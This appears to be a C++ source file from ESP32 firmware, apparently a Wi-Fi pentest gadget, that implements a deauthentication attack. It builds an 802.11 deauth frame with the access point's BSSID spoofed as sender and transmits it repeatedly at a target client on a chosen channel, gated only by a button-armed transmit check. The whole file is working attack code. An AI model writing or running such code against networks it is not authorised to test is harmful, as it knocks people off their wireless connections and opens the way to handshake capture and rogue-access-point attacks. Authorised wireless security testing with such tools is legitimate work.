#include "deauth.h"
#include "tx_arm.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>

namespace Deauth {

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) DeauthFrame;

static void hexStringToBytes(const String &hexStr, uint8_t *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        bytes[i] = (uint8_t)strtol(hexStr.substring(i*2, i*2+2).c_str(), nullptr, 16);
    }
}

void send(const String &bssid, const String &clientMac, uint8_t channel, int count) {
    if (!TxArm::isArmed()) {
        Serial.println("TX not armed - hold BACK button to enable");
        return;
    }

    DeauthFrame frame;
    frame.frame_control = 0xc0;  // Deauth frame type
    frame.duration = 0;
    frame.seq_ctrl = 0;
    frame.reason_code = 7;  // Class 3 frame from non-associated station

    hexStringToBytes(bssid, frame.bssid, 6);
    hexStringToBytes(clientMac, frame.da, 6);
    hexStringToBytes(bssid, frame.sa, 6);

    Serial.println("Sending " + String(count) + " deauth frames to " + clientMac);
    Serial.println("Target: " + bssid + " on channel " + String(channel));

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    for (int i = 0; i < count; i++) {
        if (!TxArm::isArmed()) break;

        esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false);
        delay(100);
    }

    Serial.println("Deauth sequence complete ✓");
}

} // namespace Deauth
